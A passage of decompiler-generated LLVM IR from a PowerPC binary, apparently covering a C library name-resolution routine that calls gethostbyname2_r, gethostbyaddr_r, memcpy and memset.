  br i1 %v3_1001cee4, label %dec_label_pc_1001cef4, label %dec_label_pc_1001ceec

dec_label_pc_1001ceec:                            ; preds = %dec_label_pc_1001cef4, %dec_label_pc_1001cee4, %dec_label_pc_1001ced8, %dec_label_pc_1001cec4
  store i32 512, i32* %r29.global-to-local, align 4
  %v2_1001cf20 = ptrtoint i32* %stack_var_-136 to i32
  %v2_1001cf2c = ptrtoint i8** %stack_var_-156 to i32
  %v2_1001cf30 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_1001cf04

dec_label_pc_1001cef4:                            ; preds = %dec_label_pc_1001cee4
  %v1_1001cef4 = inttoptr i32 %v0_1001cec4 to i32*
  %v2_1001cef4 = load i32, i32* %v1_1001cef4, align 4
  store i32 %v2_1001cef4, i32* %r0.global-to-local, align 4
  %v1_1001cef8 = and i32 %v2_1001cef4, 16
  store i32 %v1_1001cef8, i32* %r9.global-to-local, align 4
  %v3_1001cef8 = icmp eq i32 %v1_1001cef8, 0
  br i1 %v3_1001cef8, label %dec_label_pc_1001d030.thread, label %dec_label_pc_1001ceec

dec_label_pc_1001cf04:                            ; preds = %dec_label_pc_1001cf48.dec_label_pc_1001cf04_crit_edge, %dec_label_pc_1001ceec
  %v0_1001cf04 = phi i32 [ %v0_1001cf04.pre, %dec_label_pc_1001cf48.dec_label_pc_1001cf04_crit_edge ], [ 512, %dec_label_pc_1001ceec ]
  %v1_1001cf04 = mul i32 %v0_1001cf04, 2
  store i32 %v1_1001cf04, i32* @r29, align 4
  %v2_1001cf08 = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001cf08, i32* %r9.global-to-local, align 4
  %v1_1001cf0c = add i32 %v1_1001cf04, 30
  store i32 %v1_1001cf0c, i32* %r0.global-to-local, align 4
  %v1_1001cf14 = call i32 @__asm_rlwinm(i32 %v1_1001cf0c, i32 0, i32 0, i32 27)
  store i32 2, i32* @r4, align 4
  %v1_1001cf1c = sub i32 0, %v1_1001cf14
  store i32 %v1_1001cf1c, i32* %r0.global-to-local, align 4
  store i32 %v2_1001cf20, i32* @r5, align 4
  %v0_1001cf24 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001cf24 = load i32, i32* @r1, align 4
  %v3_1001cf24 = sub i32 %v1_1001cf24, %v1_1001cf14
  %v4_1001cf24 = inttoptr i32 %v3_1001cf24 to i32*
  store i32 %v0_1001cf24, i32* %v4_1001cf24, align 4
  %v0_1001cf28 = load i32, i32* @r29, align 4
  store i32 %v0_1001cf28, i32* @r7, align 4
  store i32 %v2_1001cf2c, i32* @r8, align 4
  store i32 %v2_1001cf30, i32* @r9, align 4
  %v1_1001cf34 = add i32 %v3_1001cf24, 23
  %v1_1001cf38 = call i32 @__asm_rlwinm(i32 %v1_1001cf34, i32 0, i32 0, i32 27)
  store i32 %v1_1001cf38, i32* @r6, align 4
  store i32 268554048, i32* @lr, align 4
  %v1_1001cf3c = call i32 @gethostbyname2_r(i32 %v1_1001cf38)
  %v3_1001cf40 = icmp eq i32 %v1_1001cf3c, 34
  br i1 %v3_1001cf40, label %dec_label_pc_1001cf48, label %dec_label_pc_1001cf58

dec_label_pc_1001cf48:                            ; preds = %dec_label_pc_1001cf04
  %v3_1001cf48 = load i32, i32* %stack_var_-160, align 4
  store i32 %v3_1001cf48, i32* %r0.global-to-local, align 4
  %v3_1001cf4c = icmp eq i32 %v3_1001cf48, -1
  br i1 %v3_1001cf4c, label %dec_label_pc_1001cf48.dec_label_pc_1001cf04_crit_edge, label %dec_label_pc_1001cf60

dec_label_pc_1001cf48.dec_label_pc_1001cf04_crit_edge: ; preds = %dec_label_pc_1001cf48
  %v0_1001cf04.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001cf04

dec_label_pc_1001cf58:                            ; preds = %dec_label_pc_1001cf04
  %v3_1001cf58 = icmp eq i32 %v1_1001cf3c, 0
  br i1 %v3_1001cf58, label %dec_label_pc_1001cf98, label %dec_label_pc_1001cf58.dec_label_pc_1001cf60_crit_edge

dec_label_pc_1001cf58.dec_label_pc_1001cf60_crit_edge: ; preds = %dec_label_pc_1001cf58
  %v3_1001cf60.pre = load i32, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1001cf60

dec_label_pc_1001cf60:                            ; preds = %dec_label_pc_1001cf48, %dec_label_pc_1001cf58.dec_label_pc_1001cf60_crit_edge
  %v0_1001cf88 = phi i32 [ %v3_1001cf60.pre, %dec_label_pc_1001cf58.dec_label_pc_1001cf60_crit_edge ], [ %v3_1001cf48, %dec_label_pc_1001cf48 ]
  store i32 %v0_1001cf88, i32* %r29.global-to-local, align 4
  %v3_1001cf64 = icmp eq i32 %v0_1001cf88, -1
  br i1 %v3_1001cf64, label %dec_label_pc_1001cf6c, label %dec_label_pc_1001cf7c

dec_label_pc_1001cf6c:                            ; preds = %dec_label_pc_1001cf60, %dec_label_pc_1001cdec
  %v0_1001cf6c = call i32 @__GI___h_errno_location()
  store i32 11, i32* %r9.global-to-local, align 4
  %v0_1001cf74 = load i32, i32* %r29.global-to-local, align 4
  %v2_1001cf74 = inttoptr i32 %v0_1001cf6c to i32*
  store i32 %v0_1001cf74, i32* %v2_1001cf74, align 4
  br label %dec_label_pc_1001d3f8

dec_label_pc_1001cf7c:                            ; preds = %dec_label_pc_1001cf60
  %v3_1001cf7c = icmp eq i32 %v0_1001cf88, 2
  store i32 -3, i32* %r0.global-to-local, align 4
  br i1 %v3_1001cf7c, label %dec_label_pc_1001d038, label %dec_label_pc_1001cf88

dec_label_pc_1001cf88:                            ; preds = %dec_label_pc_1001cf7c
  %v1_1001cf88 = xor i32 %v0_1001cf88, 4
  %v1_1001cf8c = call i32 @llvm.ctlz.i32(i32 %v1_1001cf88, i1 true)
  store i32 %v1_1001cf8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001d030.thread

dec_label_pc_1001cf98:                            ; preds = %dec_label_pc_1001cf58
  %v3_1001cf98 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001cf98 = ptrtoint i8* %v3_1001cf98 to i32
  store i32 %v4_1001cf98, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v3_1001cfa0 = icmp eq i8* %v3_1001cf98, null
  br i1 %v3_1001cfa0, label %dec_label_pc_1001d058, label %dec_label_pc_1001d008

dec_label_pc_1001cfac:                            ; preds = %dec_label_pc_1001d008
  %v0_1001cfac = load i32, i32* @r28, align 4
  %v1_1001cfac = inttoptr i32 %v0_1001cfac to i32*
  %v2_1001cfac = load i32, i32* %v1_1001cfac, align 4
  store i32 %v2_1001cfac, i32* %r11.global-to-local, align 4
  %v3_1001cfb0 = icmp eq i32 %v2_1001cfac, 0
  br i1 %v3_1001cfb0, label %dec_label_pc_1001cfb8, label %dec_label_pc_1001cfd4

dec_label_pc_1001cfb8:                            ; preds = %dec_label_pc_1001cfac
  %v0_1001cfb8 = load i32, i32* @r1, align 4
  %v1_1001cfb8 = inttoptr i32 %v0_1001cfb8 to i32*
  %v2_1001cfb8 = load i32, i32* %v1_1001cfb8, align 4
  %v2_1001cfbc = add i32 %v0_1001cfb8, -48
  %v3_1001cfbc = inttoptr i32 %v2_1001cfbc to i32*
  store i32 %v2_1001cfb8, i32* %v3_1001cfbc, align 4
  %v1_1001cfc0 = add i32 %v0_1001cfb8, -25
  store i32 %v1_1001cfc0, i32* %r0.global-to-local, align 4
  %v1_1001cfc4 = call i32 @__asm_rlwinm(i32 %v1_1001cfc0, i32 0, i32 0, i32 27)
  store i32 %v1_1001cfc4, i32* %r0.global-to-local, align 4
  store i32 %v1_1001cfc4, i32* %r9.global-to-local, align 4
  %v1_1001cfcc = load i32, i32* @r28, align 4
  %v2_1001cfcc = inttoptr i32 %v1_1001cfcc to i32*
  store i32 %v1_1001cfc4, i32* %v2_1001cfcc, align 4
  %v0_1001cfd0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001cfd0 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001cfd0 = add i32 %v1_1001cfd0, 24
  %v3_1001cfd0 = inttoptr i32 %v2_1001cfd0 to i32*
  store i32 %v0_1001cfd0, i32* %v3_1001cfd0, align 4
  %v0_1001cfd4.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001cfd4

dec_label_pc_1001cfd4:                            ; preds = %dec_label_pc_1001cfac, %dec_label_pc_1001cfb8
  %v0_1001cfd4 = phi i32 [ %v0_1001cfac, %dec_label_pc_1001cfac ], [ %v0_1001cfd4.pre, %dec_label_pc_1001cfb8 ]
  %v1_1001cfd4 = inttoptr i32 %v0_1001cfd4 to i32*
  %v2_1001cfd4 = load i32, i32* %v1_1001cfd4, align 4
  store i32 %v2_1001cfd4, i32* %r9.global-to-local, align 4
  %v2_1001cfdc = inttoptr i32 %v2_1001cfd4 to i32*
  store i32 0, i32* %v2_1001cfdc, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001cfe4 = load i32, i32* @r28, align 4
  %v1_1001cfe4 = inttoptr i32 %v0_1001cfe4 to i32*
  %v2_1001cfe4 = load i32, i32* %v1_1001cfe4, align 4
  %v2_1001cfe8 = add i32 %v2_1001cfe4, 4
  %v3_1001cfe8 = inttoptr i32 %v2_1001cfe8 to i32*
  store i32 2, i32* %v3_1001cfe8, align 4
  %v3_1001cfec = load i8*, i8** %stack_var_-156, align 4
  %v4_1001cfec = ptrtoint i8* %v3_1001cfec to i32
  store i32 %v4_1001cfec, i32* %r9.global-to-local, align 4
  %v0_1001cff0 = load i32, i32* @r28, align 4
  %v1_1001cff0 = inttoptr i32 %v0_1001cff0 to i32*
  %v2_1001cff0 = load i32, i32* %v1_1001cff0, align 4
  %v1_1001cff4 = add i32 %v4_1001cfec, 16
  %v2_1001cff4 = inttoptr i32 %v1_1001cff4 to i32*
  %v3_1001cff4 = load i32, i32* %v2_1001cff4, align 4
  store i32 %v3_1001cff4, i32* %r9.global-to-local, align 4
  %v1_1001cff8 = add i32 %v2_1001cff0, 8
  store i32 %v1_1001cff8, i32* @r3, align 4
  %v1_1001cffc = load i32, i32* @r10, align 4
  %v2_1001cffc = add i32 %v1_1001cffc, %v3_1001cff4
  %v3_1001cffc = inttoptr i32 %v2_1001cffc to i32*
  %v4_1001cffc = load i32, i32* %v3_1001cffc, align 4
  store i32 %v4_1001cffc, i32* @r4, align 4
  store i32 268554244, i32* @lr, align 4
  %v0_1001d000 = call i32 @memcpy()
  %v0_1001d004 = load i32, i32* @r28, align 4
  %v1_1001d004 = inttoptr i32 %v0_1001d004 to i32*
  %v2_1001d004 = load i32, i32* %v1_1001d004, align 4
  store i32 %v2_1001d004, i32* @r28, align 4
  %v3_1001d008.pre = load i8*, i8** %stack_var_-156, align 4
  %v0_1001d00c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001d008

dec_label_pc_1001d008:                            ; preds = %dec_label_pc_1001cf98, %dec_label_pc_1001cfd4
  %v0_1001d00c = phi i32 [ %v0_1001d00c.pre, %dec_label_pc_1001cfd4 ], [ 0, %dec_label_pc_1001cf98 ]
  %v3_1001d008 = phi i8* [ %v3_1001d008.pre, %dec_label_pc_1001cfd4 ], [ %v3_1001cf98, %dec_label_pc_1001cf98 ]
  %v4_1001d008 = ptrtoint i8* %v3_1001d008 to i32
  store i32 %v4_1001d008, i32* %r9.global-to-local, align 4
  %v1_1001d00c = mul i32 %v0_1001d00c, 4
  store i32 %v1_1001d00c, i32* @r10, align 4
  store i32 4, i32* @r5, align 4
  %v1_1001d014 = add i32 %v0_1001d00c, 1
  store i32 %v1_1001d014, i32* %r30.global-to-local, align 4
  %v1_1001d018 = add i32 %v4_1001d008, 16
  %v2_1001d018 = inttoptr i32 %v1_1001d018 to i32*
  %v3_1001d018 = load i32, i32* %v2_1001d018, align 4
  store i32 %v3_1001d018, i32* %r9.global-to-local, align 4
  %v2_1001d01c = add i32 %v3_1001d018, %v1_1001d00c
  %v3_1001d01c = inttoptr i32 %v2_1001d01c to i32*
  %v4_1001d01c = load i32, i32* %v3_1001d01c, align 4
  store i32 %v4_1001d01c, i32* %r0.global-to-local, align 4
  %v3_1001d020 = icmp eq i32 %v4_1001d01c, 0
  br i1 %v3_1001d020, label %dec_label_pc_1001d058, label %dec_label_pc_1001cfac

dec_label_pc_1001d030.thread:                     ; preds = %dec_label_pc_1001cf88, %dec_label_pc_1001cef4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001d058

dec_label_pc_1001d030:                            ; preds = %dec_label_pc_1001ced8
  store i32 %v0_1001d02c, i32* %r0.global-to-local, align 4
  %v3_1001d030 = icmp eq i32 %v0_1001d02c, 0
  br i1 %v3_1001d030, label %dec_label_pc_1001d058, label %dec_label_pc_1001d040

dec_label_pc_1001d038:                            ; preds = %dec_label_pc_1001cf7c
  %v0_1001d038.pre = load i32, i32* @r30, align 4
  %v3_1001d038 = icmp eq i32 %v0_1001d038.pre, 0
  br i1 %v3_1001d038, label %dec_label_pc_1001d058, label %dec_label_pc_1001d040.thread

dec_label_pc_1001d040.thread:                     ; preds = %dec_label_pc_1001d038
  %phitmp = icmp eq i32 %v0_1001d038.pre, -3
  br label %dec_label_pc_1001d048

dec_label_pc_1001d040:                            ; preds = %dec_label_pc_1001d030
  %v3_1001d040 = icmp eq i32 %v0_1001d02c, -3
  br i1 %v3_1001d040, label %dec_label_pc_1001d048, label %dec_label_pc_1001d3d4

dec_label_pc_1001d048:                            ; preds = %dec_label_pc_1001d040.thread, %dec_label_pc_1001d040
  %v0_1001d038107111 = phi i1 [ %phitmp, %dec_label_pc_1001d040.thread ], [ true, %dec_label_pc_1001d040 ]
  store i32 3, i32* %r9.global-to-local, align 4
  br i1 %v0_1001d038107111, label %dec_label_pc_1001d3f8, label %dec_label_pc_1001d3d4

dec_label_pc_1001d058:                            ; preds = %dec_label_pc_1001d008, %dec_label_pc_1001d030.thread, %dec_label_pc_1001cf98, %dec_label_pc_1001cd5c, %dec_label_pc_1001cd4c, %dec_label_pc_1001d038, %dec_label_pc_1001d030
  %v3_1001d058 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d058, i32* %r9.global-to-local, align 4
  %v1_1001d05c = add i32 %v3_1001d058, 4
  %v2_1001d05c = inttoptr i32 %v1_1001d05c to i32*
  %v3_1001d05c = load i32, i32* %v2_1001d05c, align 4
  store i32 %v3_1001d05c, i32* %r0.global-to-local, align 4
  %v3_1001d060 = icmp eq i32 %v3_1001d05c, 0
  br i1 %v3_1001d060, label %dec_label_pc_1001d3cc, label %dec_label_pc_1001d148

dec_label_pc_1001d06c:                            ; preds = %dec_label_pc_1001cbc0
  store i32 0, i32* @r4, align 4
  store i32 28, i32* @r5, align 4
  %v2_1001d078 = ptrtoint i32* %stack_var_-233 to i32
  store i32 %v2_1001d078, i32* %r0.global-to-local, align 4
  %v1_1001d07c = call i32 @__asm_rlwinm(i32 %v2_1001d078, i32 0, i32 0, i32 27)
  store i32 %v1_1001d07c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001d07c, i32* @r3, align 4
  store i32 %v1_1001d07c, i32* %r30.global-to-local, align 4
  store i32 %v1_1001d07c, i32* %stack_var_-164, align 4
  store i32 268554384, i32* @lr, align 4
  %v0_1001d08c = call i32 @__GI_memset()
  %v0_1001d090 = load i32, i32* @r27, align 4
  %v1_1001d090 = add i32 %v0_1001d090, 4
  %v2_1001d090 = inttoptr i32 %v1_1001d090 to i32*
  %v3_1001d090 = load i32, i32* %v2_1001d090, align 4
  store i32 %v3_1001d090, i32* %r0.global-to-local, align 4
  %v3_1001d094 = icmp eq i32 %v3_1001d090, 0
  br i1 %v3_1001d094, label %dec_label_pc_1001d09c, label %dec_label_pc_1001d0c8

dec_label_pc_1001d09c:                            ; preds = %dec_label_pc_1001d06c
  %v2_1001d09c = load i32, i32* %stack_var_-256, align 4
  store i32 0, i32* @r4, align 4
  %v3_1001d0a4 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d0a4, i32* %r9.global-to-local, align 4
  store i32 28, i32* @r5, align 4
  store i32 %v2_1001d09c, i32* %stack_var_-304, align 4
  %v2_1001d0b0 = ptrtoint i32* %stack_var_-281 to i32
  store i32 %v2_1001d0b0, i32* %r0.global-to-local, align 4
  %v1_1001d0b4 = call i32 @__asm_rlwinm(i32 %v2_1001d0b0, i32 0, i32 0, i32 27)
  store i32 %v1_1001d0b4, i32* %r0.global-to-local, align 4
  %v1_1001d0b8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001d0b8 = inttoptr i32 %v1_1001d0b8 to i32*
  store i32 %v1_1001d0b4, i32* %v2_1001d0b8, align 4
  %v3_1001d0bc = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d0bc, i32* %r9.global-to-local, align 4
  %v1_1001d0c0 = inttoptr i32 %v3_1001d0bc to i32*
  %v2_1001d0c0 = load i32, i32* %v1_1001d0c0, align 4
  store i32 %v2_1001d0c0, i32* @r3, align 4
  store i32 268554440, i32* @lr, align 4
  %v0_1001d0c4 = call i32 @__GI_memset()
  %v0_1001d0c8.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1001d0c8

dec_label_pc_1001d0c8:                            ; preds = %dec_label_pc_1001d06c, %dec_label_pc_1001d09c
  %v0_1001d0c8 = phi i32 [ %v0_1001d090, %dec_label_pc_1001d06c ], [ %v0_1001d0c8.pre, %dec_label_pc_1001d09c ]
  %v1_1001d0c8 = add i32 %v0_1001d0c8, 4
  %v2_1001d0c8 = inttoptr i32 %v1_1001d0c8 to i32*
  %v3_1001d0c8 = load i32, i32* %v2_1001d0c8, align 4
  store i32 %v3_1001d0c8, i32* %r0.global-to-local, align 4
  %v3_1001d0cc = icmp eq i32 %v3_1001d0c8, 0
  br i1 %v3_1001d0cc, label %dec_label_pc_1001d0dc, label %dec_label_pc_1001d0d4

dec_label_pc_1001d0d4:                            ; preds = %dec_label_pc_1001d0c8
  %v3_1001d0d4 = icmp eq i32 %v3_1001d0c8, 10
  br i1 %v3_1001d0d4, label %dec_label_pc_1001d0dc, label %dec_label_pc_1001d114

dec_label_pc_1001d0dc:                            ; preds = %dec_label_pc_1001d0d4, %dec_label_pc_1001d0c8
  %v3_1001d0dc = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d0dc, i32* %r9.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v2_1001d0e4 = add i32 %v3_1001d0dc, 4
  %v3_1001d0e4 = inttoptr i32 %v2_1001d0e4 to i32*
  store i32 10, i32* %v3_1001d0e4, align 4
  %v0_1001d0e8 = load i32, i32* @r27, align 4
  %v1_1001d0e8 = inttoptr i32 %v0_1001d0e8 to i32*
  %v2_1001d0e8 = load i32, i32* %v1_1001d0e8, align 4
  store i32 %v2_1001d0e8, i32* %r0.global-to-local, align 4
  %v1_1001d0ec = urem i32 %v2_1001d0e8, 2
  store i32 %v1_1001d0ec, i32* %r9.global-to-local, align 4
  %v3_1001d0ec = icmp eq i32 %v1_1001d0ec, 0
  br i1 %v3_1001d0ec, label %dec_label_pc_1001d0f4, label %dec_label_pc_1001d10c

dec_label_pc_1001d0f4:                            ; preds = %dec_label_pc_1001d0dc
  %v3_1001d0f4 = load i32, i32* %stack_var_-164, align 4
  store i32 ptrtoint (i32* @global_var_1002f094.1191 to i32), i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  %v1_1001d104 = add i32 %v3_1001d0f4, 8
  store i32 %v1_1001d104, i32* @r3, align 4
  store i32 268554508, i32* @lr, align 4
  %v0_1001d108 = call i32 @memcpy()
  %v0_1001d114.pre.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_1001d10c

dec_label_pc_1001d10c:                            ; preds = %dec_label_pc_1001d0dc, %dec_label_pc_1001d0f4
  %v0_1001d114.pre = phi i32 [ %v0_1001d0e8, %dec_label_pc_1001d0dc ], [ %v0_1001d114.pre.pre, %dec_label_pc_1001d0f4 ]
  %v3_1001d10c = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d10c, i32* %r9.global-to-local, align 4
  %v1_1001d110 = inttoptr i32 %v3_1001d10c to i32*
  %v2_1001d110 = load i32, i32* %v1_1001d110, align 4
  store i32 %v2_1001d110, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001d114

dec_label_pc_1001d114:                            ; preds = %dec_label_pc_1001d0d4, %dec_label_pc_1001d10c
  %v0_1001d114 = phi i32 [ %v0_1001d0c8, %dec_label_pc_1001d0d4 ], [ %v0_1001d114.pre, %dec_label_pc_1001d10c ]
  %v1_1001d114 = add i32 %v0_1001d114, 4
  %v2_1001d114 = inttoptr i32 %v1_1001d114 to i32*
  %v3_1001d114 = load i32, i32* %v2_1001d114, align 4
  store i32 %v3_1001d114, i32* %r0.global-to-local, align 4
  %v3_1001d118 = icmp eq i32 %v3_1001d114, 0
  br i1 %v3_1001d118, label %dec_label_pc_1001d128, label %dec_label_pc_1001d120

dec_label_pc_1001d120:                            ; preds = %dec_label_pc_1001d114
  %v3_1001d120 = icmp eq i32 %v3_1001d114, 2
  br i1 %v3_1001d120, label %dec_label_pc_1001d128, label %dec_label_pc_1001d148

dec_label_pc_1001d128:                            ; preds = %dec_label_pc_1001d120, %dec_label_pc_1001d114
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1001d12c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001d12c = add i32 %v1_1001d12c, 4
  %v3_1001d12c = inttoptr i32 %v2_1001d12c to i32*
  store i32 2, i32* %v3_1001d12c, align 4
  %v0_1001d130 = load i32, i32* @r27, align 4
  %v1_1001d130 = inttoptr i32 %v0_1001d130 to i32*
  %v2_1001d130 = load i32, i32* %v1_1001d130, align 4
  store i32 %v2_1001d130, i32* %r0.global-to-local, align 4
  %v1_1001d134 = urem i32 %v2_1001d130, 2
  store i32 %v1_1001d134, i32* %r9.global-to-local, align 4
  %v3_1001d134 = icmp eq i32 %v1_1001d134, 0
  br i1 %v3_1001d134, label %dec_label_pc_1001d13c, label %dec_label_pc_1001d148

dec_label_pc_1001d13c:                            ; preds = %dec_label_pc_1001d128
  store i32 2130706433, i32* %r0.global-to-local, align 4
  %v1_1001d144 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001d144 = add i32 %v1_1001d144, 8
  %v3_1001d144 = inttoptr i32 %v2_1001d144 to i32*
  store i32 2130706433, i32* %v3_1001d144, align 4
  br label %dec_label_pc_1001d148

dec_label_pc_1001d148:                            ; preds = %dec_label_pc_1001d128, %dec_label_pc_1001d120, %dec_label_pc_1001d058, %dec_label_pc_1001d13c
  %v0_1001d148 = load i32, i32* @r25, align 4
  %v3_1001d148 = icmp eq i32 %v0_1001d148, 0
  br i1 %v3_1001d148, label %dec_label_pc_1001d3f4, label %dec_label_pc_1001d150

dec_label_pc_1001d150:                            ; preds = %dec_label_pc_1001d148
  %v3_1001d150 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001d150, i32* @r28, align 4
  store i32 0, i32* @r26, align 4
  %v3_1001d3b014 = icmp eq i32 %v3_1001d150, 0
  br i1 %v3_1001d3b014, label %dec_label_pc_1001d3f4, label %dec_label_pc_1001d15c.lr.ph

dec_label_pc_1001d15c.lr.ph:                      ; preds = %dec_label_pc_1001d150
  %v2_1001d18c = ptrtoint i32* %stack_var_-136 to i32
  %v2_1001d19c = ptrtoint i8** %stack_var_-156 to i32
  %v2_1001d1a0 = ptrtoint i32* %stack_var_-160 to i32
  %v2_1001d214 = ptrtoint i32* %stack_var_-116 to i32
  br label %dec_label_pc_1001d15c

dec_label_pc_1001d15c:                            ; preds = %dec_label_pc_1001d15c.lr.ph, %dec_label_pc_1001d3ac
  %v0_1001d18454 = phi i32 [ %v3_1001d150, %dec_label_pc_1001d15c.lr.ph ], [ %v2_1001d3ac, %dec_label_pc_1001d3ac ]
  %v0_1001d15c = load i32, i32* @r27, align 4
  %v1_1001d15c = inttoptr i32 %v0_1001d15c to i32*
  %v2_1001d15c = load i32, i32* %v1_1001d15c, align 4
  store i32 %v2_1001d15c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r22.global-to-local, align 4
  %v1_1001d164 = and i32 %v2_1001d15c, 2
  store i32 %v1_1001d164, i32* %r11.global-to-local, align 4
  %v3_1001d164 = icmp eq i32 %v1_1001d164, 0
  br i1 %v3_1001d164, label %dec_label_pc_1001d240, label %dec_label_pc_1001d16c

dec_label_pc_1001d16c:                            ; preds = %dec_label_pc_1001d15c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 512, i32* %r29.global-to-local, align 4
  store i32 0, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1001d178

dec_label_pc_1001d178:                            ; preds = %dec_label_pc_1001d1e0.dec_label_pc_1001d178_crit_edge, %dec_label_pc_1001d16c
  %v0_1001d184 = phi i32 [ %v0_1001d184.pre, %dec_label_pc_1001d1e0.dec_label_pc_1001d178_crit_edge ], [ %v0_1001d18454, %dec_label_pc_1001d16c ]
  %v0_1001d178 = phi i32 [ %v0_1001d178.pre, %dec_label_pc_1001d1e0.dec_label_pc_1001d178_crit_edge ], [ 512, %dec_label_pc_1001d16c ]
  %v1_1001d178 = mul i32 %v0_1001d178, 2
  store i32 %v1_1001d178, i32* %r29.global-to-local, align 4
  %v2_1001d17c = load i32, i32* %stack_var_-304, align 4
  store i32 %v2_1001d17c, i32* %r9.global-to-local, align 4
  %v1_1001d180 = add i32 %v1_1001d178, 30
  store i32 %v1_1001d180, i32* %r0.global-to-local, align 4
  %v1_1001d184 = add i32 %v0_1001d184, 8
  store i32 %v1_1001d184, i32* %r26.global-to-local, align 4
  %v1_1001d188 = call i32 @__asm_rlwinm(i32 %v1_1001d180, i32 0, i32 0, i32 27)
  store i32 %v2_1001d18c, i32* @r6, align 4
  %v1_1001d190 = sub i32 0, %v1_1001d188
  store i32 %v1_1001d190, i32* %r0.global-to-local, align 4
  %v0_1001d194 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001d194, i32* @r8, align 4
  %v0_1001d198 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d198 = load i32, i32* @r1, align 4
  %v3_1001d198 = sub i32 %v1_1001d198, %v1_1001d188
  %v4_1001d198 = inttoptr i32 %v3_1001d198 to i32*
  store i32 %v0_1001d198, i32* %v4_1001d198, align 4
  store i32 %v2_1001d19c, i32* @r10, align 4
  store i32 %v2_1001d1a0, i32* @r9, align 4
  %v0_1001d1a8 = load i32, i32* @r28, align 4
  %v1_1001d1a8 = add i32 %v0_1001d1a8, 4
  %v2_1001d1a8 = inttoptr i32 %v1_1001d1a8 to i32*
  %v3_1001d1a8 = load i32, i32* %v2_1001d1a8, align 4
  store i32 %v3_1001d1a8, i32* @r5, align 4
  %v1_1001d1ac = add i32 %v3_1001d198, 23
  %v1_1001d1b0 = call i32 @__asm_rlwinm(i32 %v1_1001d1ac, i32 0, i32 0, i32 27)
  store i32 %v1_1001d1b0, i32* @r7, align 4
  %v0_1001d1b4 = load i32, i32* @r5, align 4
  %not.v2_1001d1b8 = icmp eq i32 %v0_1001d1b4, 10
  %v6_1001d1bc = sext i1 %not.v2_1001d1b8 to i32
  store i32 %v6_1001d1bc, i32* %r4.global-to-local, align 4
  %v1_1001d1c0 = call i32 @__asm_rlwinm(i32 %v6_1001d1bc, i32 0, i32 28, i32 29)
  %v1_1001d1c4 = add i32 %v1_1001d1c0, 4
  store i32 %v1_1001d1c4, i32* @r4, align 4
  store i32 268554700, i32* @lr, align 4
  %v1_1001d1c8 = inttoptr i32 %v1_1001d1c4 to i8*
  %v2_1001d1c8 = call i32 @__GI_gethostbyaddr_r(i8* %v1_1001d1c8)
  store i32 %v2_1001d1c8, i32* @r30, align 4
  %v0_1001d1d0 = call i32 @__errno_location()
  %v1_1001d1d4 = inttoptr i32 %v0_1001d1d0 to i32*
  %v2_1001d1d4 = load i32, i32* %v1_1001d1d4, align 4
  store i32 %v2_1001d1d4, i32* %r0.global-to-local, align 4
  %v0_1001d1d8 = load i32, i32* @r30, align 4
  %v4_1001d1d8 = icmp eq i32 %v0_1001d1d8, %v2_1001d1d4
  br i1 %v4_1001d1d8, label %dec_label_pc_1001d1e0, label %dec_label_pc_1001d1ec

dec_label_pc_1001d1e0:                            ; preds = %dec_label_pc_1001d178
  %v3_1001d1e0 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001d1e0 = ptrtoint i8* %v3_1001d1e0 to i32
  store i32 %v4_1001d1e0, i32* %r0.global-to-local, align 4
  %v3_1001d1e4 = icmp eq i8* %v3_1001d1e0, inttoptr (i32 -1 to i8*)
  br i1 %v3_1001d1e4, label %dec_label_pc_1001d1e0.dec_label_pc_1001d178_crit_edge, label %dec_label_pc_1001d1ec

dec_label_pc_1001d1e0.dec_label_pc_1001d178_crit_edge: ; preds = %dec_label_pc_1001d1e0
  %v0_1001d178.pre = load i32, i32* @r29, align 4
  %v0_1001d184.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001d178

dec_label_pc_1001d1ec:                            ; preds = %dec_label_pc_1001d178, %dec_label_pc_1001d1e0
  %v0_1001d1d8.lcssa = phi i32 [ %v0_1001d1d8, %dec_label_pc_1001d178 ], [ %v2_1001d1d4, %dec_label_pc_1001d1e0 ]
  %v3_1001d1ec = icmp eq i32 %v0_1001d1d8.lcssa, 0
  br i1 %v3_1001d1ec, label %dec_label_pc_1001d200, label %dec_label_pc_1001d1f4

dec_label_pc_1001d1f4:                            ; preds = %dec_label_pc_1001d1ec
  %v3_1001d1f4 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001d1f4 = ptrtoint i8* %v3_1001d1f4 to i32
  store i32 %v4_1001d1f4, i32* @r30, align 4
  %v3_1001d1f8 = icmp eq i8* %v3_1001d1f4, inttoptr (i32 -1 to i8*)
